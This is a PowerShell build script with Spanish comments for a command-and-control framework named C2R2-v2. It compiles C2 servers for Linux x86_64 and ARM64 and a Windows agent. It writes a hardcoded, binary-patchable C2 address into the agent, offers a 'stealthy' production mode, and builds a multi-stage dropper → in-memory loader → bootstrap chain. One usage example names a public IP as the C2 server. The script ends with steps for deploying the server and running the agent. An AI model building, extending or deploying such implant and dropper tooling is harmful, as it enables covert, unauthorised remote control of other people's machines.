#!/usr/bin/env pwsh
# Script para compilar C2R2-v2 en Windows sin Docker
# Uso: .\build-all.ps1 -ServerIP 181.231.253.69 -ServerPort 4444

param(
    [string]$ServerIP = "127.0.0.1",
    [int]$ServerPort = 4444,
    [string]$AgentName = "agent",
    [switch]$Production,
    [switch]$NoCache,
    [switch]$MultiStage,
    [switch]$Help
)

# Colores para output
function Write-Color {
    param([string]$Text, [string]$Color = "White")
    Write-Host $Text -ForegroundColor $Color
}

# Banner
Write-Color "╔════════════════════════════════════════╗" Cyan
Write-Color "║   C2R2-v2 Native Build System          ║" Cyan
Write-Color "╚════════════════════════════════════════╝" Cyan
Write-Host ""

if ($Help) {
    Write-Host "Uso: .\build-all.ps1 [opciones]"
    Write-Host ""
    Write-Host "Opciones:"
    Write-Host "  -ServerIP <IP>       IP del servidor C2 (default: 127.0.0.1)"
    Write-Host "  -ServerPort <PORT>   Puerto del servidor C2 (default: 4444)"
    Write-Host "  -AgentName <NAME>    Nombre del agente (default: agent)"
    Write-Host "  -Production          Compilar en modo producción (stealthy)"
    Write-Host "  -MultiStage          Compilar sistema multi-stage (ESTER→JAVELIN→Stage0)"
    Write-Host "  -NoCache             Forzar rebuild limpiando target/"
    Write-Host "  -Help                Mostrar esta ayuda"
    Write-Host ""
    Write-Host "Ejemplos:"
    Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -ServerPort 4444"
    Write-Host "  .\build-all.ps1 -ServerIP 181.231.253.69 -Production"
    Write-Host "  .\build-all.ps1 -AgentName agent-prod -Production"
    Write-Host "  .\build-all.ps1 -ServerIP 192.168.1.10 -MultiStage -Production"
    exit 0
}

# Mostrar configuración
Write-Color "📋 Configuración de compilación:" Yellow
Write-Host "   • Servidor: " -NoNewline
Write-Color "${ServerIP}:${ServerPort}" Green
Write-Host "   • Agente: " -NoNewline
Write-Color "${AgentName}.exe" Green
Write-Host "   • Modo: " -NoNewline
if ($Production) {
    Write-Color "PRODUCCIÓN (stealthy)" Green
} else {
    Write-Color "DESARROLLO (debug)" Green
}
if ($MultiStage) {
    Write-Host "   • Multi-Stage: " -NoNewline
    Write-Color "ACTIVADO (ESTER→JAVELIN→Stage0)" Green
}
Write-Host ""

# Confirmar
$response = Read-Host "¿Continuar con la compilación? [Y/n]"
if ($response -and $response -notmatch '^[Yy]$') {
    Write-Color "⚠️  Compilación cancelada" Yellow
    exit 0
}

# Crear directorio dist
New-Item -ItemType Directory -Force -Path "dist" | Out-Null

# Limpiar caché si se solicita
if ($NoCache) {
    Write-Color "⚠️  Limpiando caché (target/)..." Yellow
    if (Test-Path "target") {
        Remove-Item -Recurse -Force "target"
    }
}

# Configurar variables de entorno para el agent
$env:SERVER_IP = $ServerIP
$env:SERVER_PORT = $ServerPort

# Determinar features para el agent
$agentFeatures = if ($Production) { "production" } else { "dev" }

Write-Host ""
Write-Color "🔨 Compilando componentes..." Cyan
Write-Host ""

# Verificar WSL
$wslAvailable = (Get-Command wsl -ErrorAction SilentlyContinue) -ne $null
if (-not $wslAvailable) {
    Write-Color "❌ WSL no está disponible. Es necesario para compilar el servidor Linux." Red
    Write-Host ""
    Write-Host "Para instalar WSL:"
    Write-Host "  1. wsl --install"
    Write-Host "  2. Reiniciar"
    Write-Host "  3. Instalar Rust en WSL: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    exit 1
}

Write-Color "✓ WSL detectado" Green
Write-Host ""

# ============================================================================
# 1. Compilar Servidor en WSL (Linux x86_64)
# ============================================================================
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "📦 [1/3] Compilando servidor en WSL (Linux x86_64)..." Yellow
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue

# Verificar si Rust está instalado en WSL
Write-Color "⚙️  Verificando Rust en WSL..." Cyan
$rustCheck = wsl bash -c "source ~/.cargo/env 2>/dev/null && command -v cargo" 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Color "❌ Rust no está instalado en WSL" Red
    Write-Host ""
    Write-Host "Para instalar Rust en WSL, ejecuta en WSL:"
    Write-Host "  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
    Write-Host "  source ~/.cargo/env"
    exit 1
}

Write-Color "✓ Rust disponible en WSL" Green

# Compilar en WSL para x86_64
wsl bash -c "source ~/.cargo/env && cd /mnt/e/repos/C2R2-v2.2 && cargo build --release --package c2r2-server 2>&1" | ForEach-Object {
    if ($_ -match "error\[|failed") {
        Write-Color $_ Red
    } elseif ($_ -match "warning:") {
        Write-Color $_ Yellow
    } elseif ($_ -match "Compiling|Finished") {
        Write-Color $_ Cyan
    } else {
        Write-Host $_
    }
}

if ($LASTEXITCODE -eq 0) {
    Copy-Item "target\release\c2r2-server" "dist\c2r2-server-x86_64" -Force
    Write-Color "✅ Servidor Linux x86_64 compilado: dist\c2r2-server-x86_64" Green
} else {
    Write-Color "❌ Error compilando servidor x86_64 en WSL" Red
    exit 1
}

Write-Host ""

# ============================================================================
# 2. Compilar Servidor en WSL (Linux ARM64 para Raspberry Pi)
# ============================================================================
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "📦 [2/3] Compilando servidor en WSL (Linux ARM64)..." Yellow
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue

# Configurar linker para ARM64 cross-compilation
Write-Color "⚙️  Configurando linker aarch64 en WSL..." Cyan
wsl bash -c 'mkdir -p ~/.cargo && echo "[target.aarch64-unknown-linux-gnu]" > ~/.cargo/config.toml && echo "linker = \"aarch64-linux-gnu-gcc\"" >> ~/.cargo/config.toml'

# Verificar/instalar target ARM64 en WSL
Write-Color "⚙️  Verificando target ARM64 en WSL..." Cyan
$armCheck = wsl bash -c "source ~/.cargo/env && rustup target list --installed | grep aarch64-unknown-linux-gnu" 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Color "⚙️  Instalando target aarch64-unknown-linux-gnu en WSL..." Yellow
    wsl bash -c "source ~/.cargo/env && rustup target add aarch64-unknown-linux-gnu"
    if ($LASTEXITCODE -ne 0) {
        Write-Color "❌ Error instalando target ARM64" Red
        exit 1
    }
}

Write-Color "✓ Target ARM64 disponible" Green

# Obtener el path WSL del directorio actual
$currentPath = (Get-Location).Path
$wslPath = $currentPath -replace '\\', '/' -replace '^([A-Za-z]):', { '/mnt/' + $_.Groups[1].Value.ToLower() }

# Compilar en WSL para ARM64
wsl bash -c "source ~/.cargo/env && cd $wslPath && cargo build --release --package c2r2-server --target aarch64-unknown-linux-gnu 2>&1" | ForEach-Object {
    if ($_ -match "error\[|failed") {
        Write-Color $_ Red
    } elseif ($_ -match "warning:") {
        Write-Color $_ Yellow
    } elseif ($_ -match "Compiling|Finished") {
        Write-Color $_ Cyan
    } else {
        Write-Host $_
    }
}

if ($LASTEXITCODE -eq 0) {
    Copy-Item "target\aarch64-unknown-linux-gnu\release\c2r2-server" "dist\c2r2-server-arm64" -Force
    Write-Color "✅ Servidor Linux ARM64 compilado: dist\c2r2-server-arm64" Green
} else {
    Write-Color "⚠️  Error compilando servidor ARM64" Yellow
    Write-Color "ℹ️  Nota: ARM64 cross-compilation requiere gcc-aarch64-linux-gnu" Cyan
    Write-Host "    En WSL: sudo apt install gcc-aarch64-linux-gnu"
}

Write-Host ""

# ============================================================================
# 3. Compilar Agent para Windows
# ============================================================================
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
Write-Color "📦 [3/3] Compilando agent (Windows x86_64)..." Yellow
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue

# Generar config.rs con la IP y puerto del servidor
Write-Color "⚙️  Configurando agent con C2 server: ${ServerIP}:${ServerPort}" Cyan

# Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
# Marcador: 32 bytes + Dirección máxima: 64 bytes = 96 bytes total
$marker = "C2R2_SERVER_ADDRESS_PLACEHOLDER_"
$serverAddress = "${ServerIP}:${ServerPort}"
$maxAddrLen = 64
$paddingLen = $maxAddrLen - $serverAddress.Length

# Generar padding nulo usando \0
$padding = "\0" * $paddingLen
$paddedAddress = $marker + $serverAddress + $padding

$configContent = @"
// Generado automáticamente por C2R2 Builder v2.0
// IMPORTANTE: Este archivo contiene un marcador para permitir binary patching sin recompilación

// Dirección del servidor C2 con marcador mágico y padding para permitir reemplazo in-place
// Formato: "C2R2_SERVER_ADDRESS_PLACEHOLDER_" + "IP:PORT" + padding nulo (total 96 bytes)
// El marcador permite localizar esta cadena en el binario y reemplazar la IP sin recompilar
// NOTA: Se usa #[used] y #[no_mangle] para evitar que el compilador elimine o optimice esta constante
#[used]
#[no_mangle]
pub static C2_SERVER_PADDED: &[u8; 96] = b"${paddedAddress}";

/// Obtiene la dirección del servidor C2 limpia (sin marcador ni padding)
/// Esto extrae solo la parte "IP:PORT" después del marcador
pub fn get_c2_server() -> &'static str {
    // El marcador tiene 32 bytes, después viene la IP:PORT
    let without_marker = &C2_SERVER_PADDED[32..];
    // Convertir bytes a str y remover padding nulo
    let str_slice = std::str::from_utf8(without_marker).unwrap_or("");
    str_slice.trim_end_matches('\0')
}

// Para compatibilidad con código existente
pub const C2_SERVER: &str = "${serverAddress}";

"@
Set-Content -Path "agent\src\config.rs" -Value $configContent -NoNewline
Write-Color "✓ Configuración generada con soporte para binary patching" Green

# Configurar entorno de Visual Studio para compilar aws-lc-sys
$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
if (Test-Path $vsWhere) {
    $vsPath = & $vsWhere -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2>$null
    if ($vsPath) {
        $vcvarsall = Join-Path $vsPath "VC\Auxiliary\Build\vcvars64.bat"
        if (Test-Path $vcvarsall) {
            Write-Color "⚙️  Configurando entorno Visual Studio..." Cyan
            # Ejecutar vcvars64.bat y capturar las variables de entorno
            cmd /c "call `"$vcvarsall`" && set" 2>$null | ForEach-Object {
                if ($_ -match "^([^=]+)=(.*)$") {
                    [System.Environment]::SetEnvironmentVariable($matches[1], $matches[2], "Process")
                }
            }
            Write-Color "✓ Entorno Visual Studio configurado" Green
        }
    }
}

cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-Object {
    if ($_ -match "error|failed") {
        Write-Color $_ Red
    } elseif ($_ -match "warning") {
        Write-Color $_ Yellow
    } elseif ($_ -match "Compiling|Finished") {
        Write-Color $_ Cyan
    } else {
        Write-Host $_
    }
}

if ($LASTEXITCODE -eq 0) {
    Copy-Item "target\release\agent.exe" "dist\${AgentName}.exe" -Force
    Write-Color "✅ Agent compilado: dist\${AgentName}.exe" Green
} else {
    Write-Color "❌ Error compilando agent" Red
    exit 1
}

Write-Host ""

# ============================================================================
# 4. Compilar Multi-Stage System (Opcional)
# ============================================================================
if ($MultiStage) {
    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
    Write-Color "📦 [4/4] Compilando sistema multi-stage..." Yellow
    Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Blue
    
    Write-Color "⚙️  Compilando ESTER (Stage 1: Dropper)..." Cyan
    cargo build --release --package ester --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
        if ($_ -match "error|failed") {
            Write-Color $_ Red
        } elseif ($_ -match "warning") {
            Write-Color $_ Yellow
        } elseif ($_ -match "Compiling|Finished") {
            Write-Color $_ Cyan
        }
    }
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "target\x86_64-pc-windows-gnu\release\ester.exe" "dist\ester.exe" -Force
        Write-Color "✅ ESTER compilado: dist\ester.exe" Green
    } else {
        Write-Color "⚠️  Error compilando ESTER" Yellow
    }
    
    Write-Color "⚙️  Compilando JAVELIN (Stage 2: In-Memory Loader)..." Cyan
    cargo build --release --package javelin --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
        if ($_ -match "error|failed") {
            Write-Color $_ Red
        } elseif ($_ -match "warning") {
            Write-Color $_ Yellow
        } elseif ($_ -match "Compiling|Finished") {
            Write-Color $_ Cyan
        }
    }
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "target\x86_64-pc-windows-gnu\release\javelin.exe" "dist\javelin.exe" -Force
        Write-Color "✅ JAVELIN compilado: dist\javelin.exe" Green
    } else {
        Write-Color "⚠️  Error compilando JAVELIN" Yellow
    }
    
    Write-Color "⚙️  Compilando Stage0 (Stage 3: Bootstrap)..." Cyan
    cargo build --release --package stage0 --features $agentFeatures --target x86_64-pc-windows-gnu 2>&1 | ForEach-Object {
        if ($_ -match "error|failed") {
            Write-Color $_ Red
        } elseif ($_ -match "warning") {
            Write-Color $_ Yellow
        } elseif ($_ -match "Compiling|Finished") {
            Write-Color $_ Cyan
        }
    }
    
    if ($LASTEXITCODE -eq 0) {
        Copy-Item "target\x86_64-pc-windows-gnu\release\stage0.exe" "dist\stage0.exe" -Force
        Write-Color "✅ Stage0 compilado: dist\stage0.exe" Green
    } else {
        Write-Color "⚠️  Error compilando Stage0" Yellow
    }
    
    Write-Host ""
    Write-Color "ℹ️  Nota: Los stages tienen payloads placeholder" Cyan
    Write-Color "   Requieren integración con builder para embeber payloads cifrados" Cyan
    Write-Color "   Flujo: ESTER → JAVELIN (memoria) → Stage0 (memoria) → Agent completo" Cyan
    Write-Host ""
}

# ============================================================================
# Verificar resultados
# ============================================================================
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Green
Write-Color "✅ Compilación completada!" Green
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Green
Write-Host ""

Write-Color "📦 Binarios generados en dist/:" Yellow
Get-ChildItem "dist" -File | ForEach-Object {
    $size = "{0:N2} MB" -f ($_.Length / 1MB)
    Write-Host "   • $($_.Name) " -NoNewline
    Write-Color "($size)" Green
}

# Crear archivo BUILD_INFO
$componentsList = @"
- c2r2-server-x86_64 (Linux x86_64, built in WSL)
- c2r2-server-arm64 (Linux ARM64 for Raspberry Pi, built in WSL)
- ${AgentName}.exe (Windows x86_64)
"@

if ($MultiStage) {
    $componentsList += @"

Multi-Stage Components:
- ester.exe (Stage 1: Dropper/Validator)
- javelin.exe (Stage 2: In-Memory Loader)
- stage0.exe (Stage 3: Bootstrap Payload)
"@
}

$buildInfo = @"
C2R2-v2 Build Information
=========================
Build Date: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Server IP: $ServerIP
Server Port: $ServerPort
Agent Name: ${AgentName}.exe
Build Mode: $(if ($Production) { "PRODUCTION" } else { "DEVELOPMENT" })
Features: $agentFeatures
Multi-Stage: $(if ($MultiStage) { "ENABLED" } else { "DISABLED" })

Components:
$componentsList
"@

$buildInfo | Out-File "dist\BUILD_INFO.txt" -Encoding UTF8

Write-Host ""
Write-Color "📋 Información guardada en: dist\BUILD_INFO.txt" Yellow

Write-Host ""
Write-Color "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" Green
Write-Color "✨ ¡Listo para usar!" Green
Write-Host ""
Write-Color "Próximos pasos:" Yellow
Write-Host ""
Write-Color "Para PC/Servidor x86_64:" Cyan
Write-Host "   1. Transfiere a Linux: " -NoNewline
Write-Color "dist\c2r2-server-x86_64" Green
Write-Host "   2. Hazlo ejecutable: " -NoNewline
Write-Color "chmod +x c2r2-server-x86_64" Green
Write-Host "   3. Ejecuta: " -NoNewline
Write-Color "./c2r2-server-x86_64 --bind 0.0.0.0 --port $ServerPort" Green
Write-Host ""
Write-Color "Para Raspberry Pi (ARM64):" Cyan
Write-Host "   1. Transfiere a Raspberry: " -NoNewline
Write-Color "dist\c2r2-server-arm64" Green
Write-Host "   2. Hazlo ejecutable: " -NoNewline
Write-Color "chmod +x c2r2-server-arm64" Green
Write-Host "   3. Ejecuta: " -NoNewline
Write-Color "./c2r2-server-arm64 --bind 0.0.0.0 --port $ServerPort" Green
Write-Host ""
Write-Color "Para Windows (Agent):" Cyan
Write-Host "   • Ejecuta: " -NoNewline
Write-Color "dist\${AgentName}.exe" Green
Write-Host ""
